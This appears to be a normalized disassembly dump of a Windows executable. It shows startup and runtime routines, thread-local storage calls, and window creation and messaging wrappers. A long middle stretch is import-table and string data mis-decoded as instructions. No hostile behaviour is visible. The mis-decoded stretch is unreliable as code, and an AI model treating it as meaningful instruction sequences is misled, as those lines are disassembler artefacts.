mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404e60
call sub_40318c
test al al
je r-xdata
call sub_403280
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401344
mov [ rw-data ] eax
call sub_40132c
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_4031bc
call sub_4012a4
call sub_405cfc
mov [ rw-data ] eax
call sub_40132c
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012a4
call sub_405cfc
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_401324
mov [ rw-data ] eax
sub_405ecc
push ebx
call sub_405ec4
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405eb8
test eax eax
jne r-xdata
mov eax 0xe2
call sub_404088
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_404088
sub_405f10
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405ecc
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405f5c
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405e98
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405f50
mov edx rw-data
mov eax ebx
call sub_403ddc
pop ebx
retn
sub_405fa0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405fc5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fcc
retn
sub_405ffc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406018
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40603d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406044
retn
sub_406050
push esp
pushad
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
push eax
pushad
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
push ebx
dec ecx
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
push ebx
dec ecx
add [ ebx + 0x4025ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
push ebx
sar bh 0x25
inc esp
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec ecx
add [ ebx + 0x3825ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x3425ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x3025ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x2825ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x2425ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x2025ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x1825ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x1425ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x1025ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0xc25ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x825ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x425ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x25ffc0 ] cl
push ebx
dec ecx
add [ ebx - 0x3da0040 ] cl
push edx
dec ecx
add [ ebx - 0x7da0040 ] cl
push edx
dec ecx
add [ ebx - 0xbda0040 ] cl
push edx
dec ecx
add [ ebx - 0xfda0040 ] cl
push edx
dec ecx
add [ ebx - 0x13da0040 ] cl
push edx
dec ecx
add [ ebx - 0x17da0040 ] cl
push edx
dec ecx
add [ ebx - 0x1bda0040 ] cl
push edx
dec ecx
add [ ebx - 0x1fda0040 ] cl
push edx
dec ecx
add [ ebx - 0x23da0040 ] cl
push edx
dec ecx
add [ ebx - 0x27da0040 ] cl
push edx
dec ecx
add [ ebx - 0x2bda0040 ] cl
push edx
dec ecx
add [ ebx - 0x2fda0040 ] cl
push edx
dec ecx
add [ ebx - 0x33da0040 ] cl
push edx
dec ecx
add [ ebx - 0x37da0040 ] cl
push edx
dec ecx
add [ ebx - 0x3bda0040 ] cl
push edx
dec ecx
add [ ebx - 0x3fda0040 ] cl
push edx
dec ecx
add [ ebx - 0x43da0040 ] cl
push edx
dec ecx
add [ ebx - 0x47da0040 ] cl
push edx
dec ecx
add [ ebx - 0x4bda0040 ] cl
push edx
dec ecx
add [ ebx - 0x4fda0040 ] cl
push edx
dec ecx
add [ ebx - 0x53da0040 ] cl
push edx
dec ecx
add [ ebx - 0x57da0040 ] cl
push edx
dec ecx
add [ ebx - 0x5bda0040 ] cl
push edx
dec ecx
add [ ebx - 0x5fda0040 ] cl
push edx
dec ecx
add [ ebx - 0x63da0040 ] cl
push edx
dec ecx
add [ ebx - 0x67da0040 ] cl
push edx
dec ecx
add [ ebx - 0x6bda0040 ] cl
push edx
dec ecx
add [ ebx - 0x6fda0040 ] cl
push edx
dec ecx
add [ ebx - 0x73da0040 ] cl
push edx
dec ecx
add [ ebx - 0x77da0040 ] cl
push edx
dec ecx
add [ ebx - 0x7bda0040 ] cl
push edx
dec ecx
add [ ebx - 0x7fda0040 ] cl
push edx
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x7825ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x7425ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x7025ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x6825ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x6425ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x6025ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x5825ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x5425ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x5025ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x4825ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x4425ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x4025ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x6825ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x6425ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x6025ffc0 ] cl
push ebx
dec ecx
add [ ebx - 0x2bda0040 ] cl
push esp
dec ecx
add [ ebx - 0x2fda0040 ] cl
push esp
dec ecx
add [ ebx - 0x33da0040 ] cl
push esp
dec ecx
add [ ebx - 0x37da0040 ] cl
push esp
dec ecx
add [ ebx - 0x3bda0040 ] cl
push esp
dec ecx
add [ ebx - 0x3fda0040 ] cl
push esp
dec ecx
add [ ebx - 0x43da0040 ] cl
push esp
dec ecx
add [ ebx - 0x47da0040 ] cl
push esp
dec ecx
add [ ebx - 0x4bda0040 ] cl
push esp
dec ecx
add [ ebx - 0x4fda0040 ] cl
push esp
dec ecx
add [ ebx - 0x53da0040 ] cl
push esp
dec ecx
add [ ebx - 0x57da0040 ] cl
push esp
dec ecx
add [ ebx - 0x5bda0040 ] cl
push esp
dec ecx
add [ ebx - 0x5fda0040 ] cl
push esp
dec ecx
add [ ebx - 0x63da0040 ] cl
push esp
dec ecx
add [ ebx - 0x67da0040 ] cl
push esp
dec ecx
add [ ebx - 0x6bda0040 ] cl
push esp
dec ecx
add [ ebx - 0x6fda0040 ] cl
push esp
dec ecx
add [ ebx - 0x73da0040 ] cl
push esp
dec ecx
add [ ebx - 0x77da0040 ] cl
push esp
dec ecx
add [ ebx - 0x7bda0040 ] cl
push esp
dec ecx
add [ ebx - 0x7fda0040 ] cl
push esp
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x7825ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x7425ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x7025ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x6825ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x6425ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x6025ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x5825ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x5425ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x5025ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x4825ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x4425ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x4025ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x3825ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x3425ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x3025ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x2825ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x2425ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x2025ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x1825ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x1425ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x1025ffc0 ] cl
push esp
dec ecx
add [ ebx + 0xc25ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x825ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x425ffc0 ] cl
push esp
dec ecx
add [ ebx + 0x25ffc0 ] cl
push esp
dec ecx
add [ ebx - 0x3da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x7da0040 ] cl
push ebx
dec ecx
add [ ebx - 0xbda0040 ] cl
push ebx
dec ecx
add [ ebx - 0xfda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x13da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x17da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x1bda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x1fda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x23da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x27da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x2bda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x2fda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x33da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x37da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x3bda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x3fda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x43da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x47da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x4bda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x4fda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x53da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x57da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x5bda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x5fda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x63da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x67da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x6bda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x6fda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x73da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x77da0040 ] cl
push ebx
dec ecx
add [ ebx - 0x7bda0040 ] cl
push ebx
dec ecx
add [ ebx - 0x7fda0040 ] cl
push ebx
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x7825ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x7425ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x7025ffc0 ] cl
push ebx
dec ecx
add [ ebx - 0x53da0040 ] cl
push edi
dec ecx
add [ ebx - 0x57da0040 ] cl
push edi
dec ecx
add [ ebx - 0x63da0040 ] cl
push edi
dec ecx
add [ ebx - 0x6fda0040 ] cl
push edi
dec ecx
add [ ebx - 0x73da0040 ] cl
push edi
dec ecx
add [ ebx - 0x77da0040 ] cl
push edi
dec ecx
add [ ebx - 0x7bda0040 ] cl
push edi
dec ecx
add [ ebx - 0x7fda0040 ] cl
push edi
dec ecx
add [ ebx - 0x67da0040 ] cl
push edi
dec ecx
add [ ebx - 0x6bda0040 ] cl
push edi
dec ecx
add [ ebx - 0x5bda0040 ] cl
push edi
dec ecx
add [ ebx - 0x5fda0040 ] cl
push edi
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x7825ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x7425ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x7025ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x6825ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x6425ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x6025ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x5825ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x5425ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x5025ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x4825ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x4425ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x4025ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x3825ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x3425ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x3025ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x2825ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x2425ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x2025ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x1825ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x1425ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x1025ffc0 ] cl
push edi
dec ecx
add [ ebx + 0xc25ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x825ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x425ffc0 ] cl
push edi
dec ecx
add [ ebx + 0x25ffc0 ] cl
push edi
dec ecx
add [ ebx - 0x3da0040 ] cl
push esi
dec ecx
add [ ebx - 0x7da0040 ] cl
push esi
dec ecx
add [ ebx - 0xbda0040 ] cl
push esi
dec ecx
add [ ebx - 0xfda0040 ] cl
push esi
dec ecx
add [ ebx - 0x13da0040 ] cl
push esi
dec ecx
add [ ebx - 0x17da0040 ] cl
push esi
dec ecx
add [ ebx - 0x1bda0040 ] cl
push esi
dec ecx
add [ ebx - 0x1fda0040 ] cl
push esi
dec ecx
add [ ebx - 0x23da0040 ] cl
push esi
dec ecx
add [ ebx - 0x27da0040 ] cl
push esi
dec ecx
add [ ebx - 0x2bda0040 ] cl
push esi
dec ecx
add [ ebx - 0x2fda0040 ] cl
push esi
dec ecx
add [ ebx - 0x33da0040 ] cl
push esi
dec ecx
add [ ebx - 0x37da0040 ] cl
push esi
dec ecx
add [ ebx - 0x3bda0040 ] cl
push esi
dec ecx
add [ ebx - 0x3fda0040 ] cl
push esi
dec ecx
add [ ebx - 0x43da0040 ] cl
push esi
dec ecx
add [ ebx - 0x47da0040 ] cl
push esi
dec ecx
add [ ebx - 0x4bda0040 ] cl
push esi
dec ecx
add [ ebx - 0x4fda0040 ] cl
push esi
dec ecx
add [ ebx - 0x53da0040 ] cl
push esi
dec ecx
add [ ebx - 0x57da0040 ] cl
push esi
dec ecx
add [ ebx - 0x5bda0040 ] cl
push esi
dec ecx
add [ ebx - 0x5fda0040 ] cl
push esi
dec ecx
add [ ebx - 0x63da0040 ] cl
push esi
dec ecx
add [ ebx - 0x67da0040 ] cl
push esi
dec ecx
add [ ebx - 0x6bda0040 ] cl
push esi
dec ecx
add [ ebx - 0x6fda0040 ] cl
push esi
dec ecx
add [ ebx - 0x73da0040 ] cl
push esi
dec ecx
add [ ebx - 0x77da0040 ] cl
push esi
dec ecx
add [ ebx - 0x7bda0040 ] cl
push esi
dec ecx
add [ ebx - 0x7fda0040 ] cl
push esi
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x7825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x7425ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x7025ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x6825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x6425ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x6025ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x5825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x5425ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x5025ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x4825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x4425ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x4025ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x3825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x3425ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x3025ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x2825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x2825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x2425ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x2025ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x1825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x1425ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x1025ffc0 ] cl
push esi
dec ecx
add [ ebx + 0xc25ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x825ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x425ffc0 ] cl
push esi
dec ecx
add [ ebx + 0x25ffc0 ] cl
push esi
dec ecx
add [ ebx - 0x3da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x7da0040 ] cl
push ebp
dec ecx
add [ ebx - 0xbda0040 ] cl
push ebp
dec ecx
add [ ebx - 0xfda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x13da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x17da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x1bda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x1fda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x23da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x27da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x2bda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x2fda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x33da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x37da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x3bda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x3fda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x43da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x47da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x4bda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x4fda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x53da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x57da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x5bda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x5fda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x63da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x67da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x6bda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x6fda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x73da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x77da0040 ] cl
push ebp
dec ecx
add [ ebx - 0x7bda0040 ] cl
push ebp
dec ecx
add [ ebx - 0x7fda0040 ] cl
push ebp
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x7825ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x7425ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x7025ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x6c25ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x6825ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x6425ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x6025ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x5c25ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x5825ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x5425ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x5025ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x4c25ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x4825ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x4425ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x4025ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x3c25ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x3825ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x3425ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x3025ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x2c25ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x2825ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x2425ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x2025ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x1c25ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x1825ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x1425ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x1025ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0xc25ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x825ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x425ffc0 ] cl
push ebp
dec ecx
add [ ebx + 0x25ffc0 ] cl
push ebp
dec ecx
add [ ebx - 0x3da0040 ] cl
push esp
dec ecx
add [ ebx - 0x7da0040 ] cl
push esp
dec ecx
add [ ebx - 0xbda0040 ] cl
push esp
dec ecx
add [ ebx - 0xfda0040 ] cl
push esp
dec ecx
add [ ebx - 0x13da0040 ] cl
push esp
dec ecx
add [ ebx - 0x17da0040 ] cl
push esp
dec ecx
add [ ebx - 0x1bda0040 ] cl
push esp
dec ecx
add [ ebx - 0x1fda0040 ] cl
push esp
dec ecx
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x5425ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x5025ffc0 ] cl
push ebx
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
add al 0x61
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x4825ffc0 ] cl
push ebx
dec ecx
add [ ebx + 0x4425ffc0 ] cl
mov eax eax
add edx [ eax + 0x60 ]
inc eax
add [ ebx + 0x3825ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x3425ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x3025ffc0 ] cl
push edx
dec ecx
add [ ebx + 0x5825ffc0 ] cl
push ebx
dec ecx
sub_406ccc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402ac0
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402ab0
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406d24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402ac0
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402ab0
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406d7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406e71
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406e99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ea0
retn
sub_406eac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406ed1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ed8
retn
sub_406ee4
inc esi
dec ecx
add al dh
inc [ eax ]
add [ esi + eax * 2 + 0x49 ] ah
add cl dh
inc [ eax ]
